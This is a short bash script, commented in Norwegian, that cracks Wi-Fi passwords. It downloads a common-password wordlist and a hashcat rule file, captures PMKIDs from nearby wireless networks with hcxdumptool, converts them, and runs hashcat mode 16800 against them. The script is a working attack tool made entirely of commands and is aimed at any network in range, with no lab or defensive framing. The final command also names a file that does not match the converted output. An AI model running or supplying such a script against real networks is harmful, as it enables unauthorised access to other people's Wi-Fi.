#!/bin/bash  

curl -o wordlist.txt https://raw.githubusercontent.com/DavidWittman/wpxmlrpcbrute/master/wordlists/1000-most-common-passwords.txt  

curl -o best64.rule https://raw.githubusercontent.com/samirettali/password-cracking-rules/master/best64.rule

# samler inn rådata som inneholder pmkids. Kjører i 5 minutter.  
hcxdumptool -o test.pcapng -i wlp3s0mon --enable_status=1 --tot=5;

# Formaterer rådataene til bedre format for hashcat  
hcxpcaptool -z test.16800 test.pcapng; 

# Cracker med GPU
hashcat -m 16800 -a 0 test.168000 wordlist.txt -r ./best64.rule;
